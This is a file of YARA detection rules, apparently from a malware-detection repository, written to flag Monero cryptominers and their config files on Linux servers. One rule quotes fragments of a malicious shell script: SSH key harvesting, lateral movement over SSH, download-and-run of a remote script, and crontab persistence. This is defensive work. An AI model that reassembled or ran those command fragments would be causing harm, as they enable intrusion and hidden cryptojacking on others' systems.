rule crypto_miner
{
	meta: 
	author= "Brian Laskowski"
	info= " Detected a cryptomining exe"

	strings:
		$miner = "stratum+tcp"
	
	condition:
		$miner
}

rule crypto_miner_config_file_0
{
	meta: 
	author= "Brian Laskowski"
	info= " Detected a cryptomining config file"

	strings:
		$m = "pool_address"
		$m1 = "wallet_address"
		$m2 = "pool_password"
		$m3 = "pool_weight"
	
	condition:
		all of them
}

rule _case110_annizod_XMR_MINER {
   meta:
      description = "case110 - file annizod"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "3c3bbbe6148f052f5d4d28171b55f6d40db65d4ef04822499c5d5e4228c2c557"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "XMRig/%sK libuv" fullword ascii
      $s3 = "xmrig" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 1000KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-03
   Identifier: case120
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_06_03_18_case120_luk_ocl {
   meta:
      description = "case120 - file luk-ocl"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "8d5e3d2e57f975078033a9f6b3360c530512448dde517f484cdf86570c36d6ca"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s3 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s11 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s12 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s13 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s14 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s15 = "trtl.pool.mine2gether.com" fullword ascii
      $s16 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s17 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s18 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s19 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s20 = "Found non-contigous pu%%u range in dumped cpuid directory `%s'" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 8000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_06_03_18_case120_luk_phi {
   meta:
      description = "case120 - file luk-phi"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "425f71ee456283d32673fcffe2641b5d6fbb1e91b2f15a91f9c34877a921ca75"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s3 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "# - all tuning parameters are auto-set and hardcoded             #" fullword ascii
      $s11 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s12 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s13 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s14 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s15 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s16 = "trtl.pool.mine2gether.com" fullword ascii
      $s17 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s18 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s19 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s20 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 8000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}


rule infected_06_03_18_case120_luk_cpu {
   meta:
      description = "case120 - file luk-cpu"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "76210f0a7710b40095d32f81bfb5d0576f81ac7cbdc63cf44ababb64cb8e65b7"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s3 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s11 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s12 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s13 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s14 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s15 = "trtl.pool.mine2gether.com" fullword ascii
      $s16 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s17 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s18 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s19 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s20 = "Found non-contigous pu%%u range in dumped cpuid directory `%s'" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 8000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _luk_cpu_luk_ocl_luk_phi_0 {
   meta:
      description = "case120 - from files luk-cpu, luk-ocl, luk-phi"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "76210f0a7710b40095d32f81bfb5d0576f81ac7cbdc63cf44ababb64cb8e65b7"
      hash2 = "8d5e3d2e57f975078033a9f6b3360c530512448dde517f484cdf86570c36d6ca"
      hash3 = "425f71ee456283d32673fcffe2641b5d6fbb1e91b2f15a91f9c34877a921ca75"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s3 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s11 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s12 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s13 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s14 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s15 = "trtl.pool.mine2gether.com" fullword ascii
      $s16 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s17 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s18 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s19 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s20 = "Found non-contigous pu%%u range in dumped cpuid directory `%s'" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
        filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_06_04_18_case116_a_crypto_miner_persistence_shell {
   meta:
      description = "case116 - file a.sh"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
      hash1 = "6149658a4e8cdcbb610429c376b676da5f2dfb17970dc09b0020052c981074bb"
   strings:
      $x1 = "yes yes| ssh -oStrictHostKeyChecking=no -i $key $user@$host  \"$WGET /dev/null $XMHTTP/YEY__$payload;$WGET -O /tmp/.XO-lock" fullword ascii
      $x2 = "yes yes| ssh -oStrictHostKeyChecking=no -i $key $user@$host  \"$WGET /dev/null $XMHTTP/YEY__$payload;$WGET -O /tmp/.XO-lock $XMH" ascii
      $x3 = "$XMHTTP/a.sh;curl -o /dev/null $XMHTTP/CYEY__$payload;curl -o /tmp/.XO-lock $XMHTTP/a.sh; sh /tmp/.XO-lock\"&" fullword ascii
      $x4 = "echo \"*/30 * * * * root  $WGET /tmp/.XO-lock $XMHTTP/a.sh;sh /tmp/.XO-lock;rm /tmp/.XO-lock\" >> /etc/crontab" fullword ascii
      $s5 = "payload=$(echo \".$me.$mykey.$key.$user@$host\") #|base64 -w0)" fullword ascii
      $s6 = "USERS=$(echo $USERS|tr ' ' '\\n'|sort|uniq|grep -v \"/bin/bash\"|grep -v \"~\"|grep -v \"/\"|grep -v keygen|grep -v \"\\-\\-help" ascii
      $s7 = "\".ssh\"|grep -v \"ssh-agent\"|grep -v sshpass|grep -v \"\\-l\"|grep -v \"\\&\")" fullword ascii
      $s8 = "KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep IdentityFile|awk -F \"IdentityFile\" '{print $2 }')" fullword ascii
      $s9 = "HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep HostName|awk -F \"HostName\" '{print $2}')" fullword ascii
      $s10 = "echo \"ssh -oStrictHostKeyChecking=no -i $key $user@$host\"" fullword ascii
      $s11 = "HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts| grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\")" fullword ascii
      $s12 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN1  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s13 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN6  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s14 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN4  -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s15 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN5  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s16 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN3  -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s17 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN2 -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s18 = "KEYS=$(find ~/ /root /home -maxdepth 2 -name '\\.ssh'|xargs find|awk '/pub|pem/')" fullword ascii
      $s19 = "proc=`grep -c ^processor /proc/cpuinfo`" fullword ascii
      $s20 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN4  -k --donate-level 1  -B" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 30KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule apache2_1_XMR_MINER {
   meta:
      description = "case125 - file apache2-1"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "b04dcace214ddb4f88efeb1a495bc123739abe8eb9815991f421e6466f893656"
   strings:
      $x1 = "{\"method\":\"login\",\"params\":{\"login\":\"%s\",\"pass\":\"%s\",\"agent\":\"xmr-stak-cpu/1.3.0-1.5.0\"},\"id\":1}" fullword ascii
      $s2 = "_ZNSt6vectorIN8executor13sck_error_logESaIS1_EE19_M_emplace_back_auxIJSsEEEvDpOT_" fullword ascii
      $s3 = "Autoconf failed: Printing config for a single thread. Please try to add new ones until the hashrate slows down." fullword ascii
      $s4 = "_ZNKSt7__cxx118time_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEE3getES4_S4_RSt8ios_baseRSt12_Ios_IostateP2tmPKwSD_" fullword ascii
      $s5 = "_ZNKSt7__cxx118time_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE3getES4_S4_RSt8ios_baseRSt12_Ios_IostateP2tmPKcSD_" fullword ascii
      $s6 = "_ZSt25notify_all_at_thread_exitRSt18condition_variableSt11unique_lockISt5mutexE" fullword ascii
      $s7 = "_ZNKSt8time_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEE3getES3_S3_RSt8ios_baseRSt12_Ios_IostateP2tmPKwSC_" fullword ascii
      $s8 = "_ZNKSt8time_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE3getES3_S3_RSt8ios_baseRSt12_Ios_IostateP2tmPKcSC_" fullword ascii
      $s9 = "_ZTINSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEEE" fullword ascii
      $s10 = "_ZTSNSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEEE" fullword ascii
      $s11 = "_ZNSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEED0Ev" fullword ascii
      $s12 = "_ZNSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEED1Ev" fullword ascii
      $s13 = "_ZTVNSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEEE" fullword ascii
      $s14 = "_ZNSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEED2Ev" fullword ascii
      $s15 = "_ZNSt6thread11_State_implISt12_Bind_simpleIFSt7_Mem_fnIM8executorFvvEEPS3_EEE6_M_runEv" fullword ascii
      $s16 = "CONNECT error: Pool port number not specified, please use format <hostname>:<port>." fullword ascii
      $s17 = "The values are not optimal, please try to tweak the values based on notes in config.txt." fullword ascii
      $s18 = "_ZN8executor16log_result_errorEOSs" fullword ascii
      $s19 = "_ZNKSt9money_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEE6do_getES3_S3_bRSt8ios_baseRSt12_Ios_IostateRSbIwS2_SaIwEE" fullword ascii
      $s20 = "_ZNKSt7__cxx118time_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE11get_weekdayES4_S4_RSt8ios_baseRSt12_Ios_IostateP2tm" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 5000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_06_07_18_case125_apache2_XMR_MINER {
   meta:
      description = "case125 - file apache2"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "3d18f4f503a72a4246b1a13327745fab15f9b34f45e17d4f6e94a311427ad4da"
   strings:
      $x1 = "{\"method\":\"login\",\"params\":{\"login\":\"%s\",\"pass\":\"%s\",\"agent\":\"xmr-stak-cpu/1.3.0-1.5.0\"},\"id\":1}" fullword ascii
      $s2 = "_ZNKSt12__shared_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EE14_M_get_deleterERKSt9type_info" fullword ascii
      $s3 = "_ZNKSt19__shared_ptr_accessISt5mutexLN9__gnu_cxx12_Lock_policyE2ELb0ELb0EE6_M_getEv" fullword ascii
      $s4 = "_ZNKSt12__shared_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EE3getEv" fullword ascii
      $s5 = "_ZN8executor16log_result_errorEONSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE" fullword ascii
      $s6 = "_ZN8executor16log_socket_errorEONSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE" fullword ascii
      $s7 = "_ZNSt10__weak_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EE9_M_assignEPS0_RKSt14__shared_countILS2_2EE" fullword ascii
      $s8 = "_ZNSt12__shared_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EEC4ERKSt10__weak_ptrIS0_LS2_2EESt9nothrow_t" fullword ascii
      $s9 = "Autoconf failed: Printing config for a single thread. Please try to add new ones until the hashrate slows down." fullword ascii
      $s10 = "_ZN8executor15hashrate_reportERNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE" fullword ascii
      $s11 = "get<0, std::__future_base::_State_baseV2::_Make_ready*, std::default_delete<std::__future_base::_State_baseV2::_Make_ready> >" fullword ascii
      $s12 = "get<1, std::__future_base::_State_baseV2::_Make_ready*, std::default_delete<std::__future_base::_State_baseV2::_Make_ready> >" fullword ascii
      $s13 = "_ZNKSt19__shared_ptr_accessISt5mutexLN9__gnu_cxx12_Lock_policyE2ELb0ELb0EEdeEv" fullword ascii
      $s14 = "_ZNKSt19__shared_ptr_accessISt5mutexLN9__gnu_cxx12_Lock_policyE2ELb0ELb0EEptEv" fullword ascii
      $s15 = "_ZSt25notify_all_at_thread_exitRSt18condition_variableSt11unique_lockISt5mutexE" fullword ascii
      $s16 = "__shared_ptr_access<std::mutex, (__gnu_cxx::_Lock_policy)2, false, false>" fullword ascii
      $s17 = "not enough space for format expansion (Please submit full bug report at https://gcc.gnu.org/bugsbasic_string::_S_create" fullword ascii
      $s18 = "_ZNSt12__shared_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EEaSEOS3_" fullword ascii
      $s19 = "_ZNKSt12__shared_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EEcvbEv" fullword ascii
      $s20 = "_ZNSt12__shared_ptrISt5mutexLN9__gnu_cxx12_Lock_policyE2EE5resetEv" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 5000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _apache2_apache2_1_0_XMR_MINER {
   meta:
      description = "case125 - from files apache2, apache2-1"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "3d18f4f503a72a4246b1a13327745fab15f9b34f45e17d4f6e94a311427ad4da"
      hash2 = "b04dcace214ddb4f88efeb1a495bc123739abe8eb9815991f421e6466f893656"
   strings:
      $x1 = "{\"method\":\"login\",\"params\":{\"login\":\"%s\",\"pass\":\"%s\",\"agent\":\"xmr-stak-cpu/1.3.0-1.5.0\"},\"id\":1}" fullword ascii
      $s2 = "Autoconf failed: Printing config for a single thread. Please try to add new ones until the hashrate slows down." fullword ascii
      $s3 = "_ZSt25notify_all_at_thread_exitRSt18condition_variableSt11unique_lockISt5mutexE" fullword ascii
      $s4 = "CONNECT error: Pool port number not specified, please use format <hostname>:<port>." fullword ascii
      $s5 = "The values are not optimal, please try to tweak the values based on notes in config.txt." fullword ascii
      $s6 = "Pool connection lost. Waiting %lld s before retry (attempt %llu)." fullword ascii
      $s7 = "PARSE error: Login protocol error 1" fullword ascii
      $s8 = "PARSE error: Login protocol error 3" fullword ascii
      $s9 = "PARSE error: Login protocol error 2" fullword ascii
      $s10 = "_ZNSt18condition_variable4waitERSt11unique_lockISt5mutexE" fullword ascii
      $s11 = "_ZGTtNSt11logic_errorC2ERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE" fullword ascii
      $s12 = "_ZGTtNSt11logic_errorC1ERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE" fullword ascii
      $s13 = "_ZTISt11_Mutex_baseILN9__gnu_cxx12_Lock_policyE2EE" fullword ascii
      $s14 = "_ZTSSt11_Mutex_baseILN9__gnu_cxx12_Lock_policyE2EE" fullword ascii
      $s15 = "_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE12_M_constructIPcEEvT_S7_St20forward_iterator_tag" fullword ascii
      $s16 = "_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE12_M_constructIPKcEEvT_S8_St20forward_iterator_tag" fullword ascii
      $s17 = "_Z26_txnal_logic_error_get_msgPv" fullword ascii
      $s18 = "execute_native_thread_routine_compat" fullword ascii
      $s19 = "_ZNSs12_S_constructIN9__gnu_cxx17__normal_iteratorIPcSsEEEES2_T_S4_RKSaIcESt20forward_iterator_tag" fullword ascii
      $s20 = "Autoconf failed: L3 size sanity check failed - %u KB." fullword ascii
   condition:
      ( uint16(0) == 0x457f and
        filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

